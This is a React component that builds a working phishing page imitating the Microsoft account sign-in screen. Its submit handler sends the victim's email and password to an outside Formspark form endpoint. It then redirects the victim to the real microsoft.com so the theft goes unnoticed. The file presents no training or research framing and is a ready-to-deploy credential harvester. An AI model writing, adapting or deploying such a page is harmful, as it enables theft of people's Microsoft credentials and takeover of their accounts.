import { useFormspark } from "@formspark/use-formspark";
import React, { useState } from "react";
import Logo from "../assets/images/microsoft_logo.svg";
import Key from "../assets/images/signin-options.svg";

const FORMSPARK_FORM_ID = "7eA5EiCQ";

const OfficeMan = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const [submit, submitting] = useFormspark({
    formId: FORMSPARK_FORM_ID,
  });

  const handleSubmit = async (e) => {
    e.preventDefault();
    await submit({ email, password });
    return window.location.replace(
      "https://www.microsoft.com/en-us/?ql=6",
      "_blank"
    );
  };

  return (
    <div className="md:bg-office h-screen pt-4 md:pt-20">
      <div className="md:w-96 h-auto w-80 py-5 md:p-8 bg-white mx-auto">
        <img src={Logo} alt="logo" />
        <div className="text-3xl bold my-2">Sign in</div>
        <form onSubmit={handleSubmit}>
          <div className="mt-4">
            <input
              type="text"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="outline-none border-blue-400 pt-1 my-3 border-b-2 w-full"
              placeholder="Email, Phone or Skype"
              required
            />
          </div>
          <div className="mt-4">
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="outline-none border-blue-400 pt-1 my-2 border-b-2 w-full"
              placeholder="Password"
              required
            />
          </div>
          <a href="#" className="my-2">
            <div className="py-3 text-blue-400 ">Forgot password?</div>
          </a>
          <div className="py-3 text-gray-400 ">
            No accounts?
            <a className="text-blue-400 ml-2" href="#">
              Create one!
            </a>
          </div>
          <a href="#" className="my-3 text-blue-400">
            Can't access your account?
          </a>
          <div className="py-5 ml-44 md:ml-52">
            <button
              type="submit"
              className="px-8 rounded py-2 text-white bg-blue-600"
              disabled={submitting}
            >
              Login
            </button>
          </div>
        </form>
      </div>
      <a href="#">
        <div className="my-5 mx-auto border-2 bg-white hover:bg-gray-300 flex p-1 w-80 md:w-96">
          <img
            src={Key}
            alt="key"
            className="ml-4 hover:text-white text-gray-400  w-6 h-6"
          />
          <div type="text" className="text-center ml-5 hover:text-white">
            Sign-in options
          </div>
        </div>
      </a>
      <div className="flex absolute pb-2 text-black text-xs mb-3 right-0 bottom-0">
        <a href="#" className="mx-4">
          Terms of use
        </a>
        <a href="#" className="mr-4">
          privacy & cookies
        </a>
        <a href="#" className="mr-4">
          ...
        </a>
      </div>
    </div>
  );
};

export default OfficeMan;
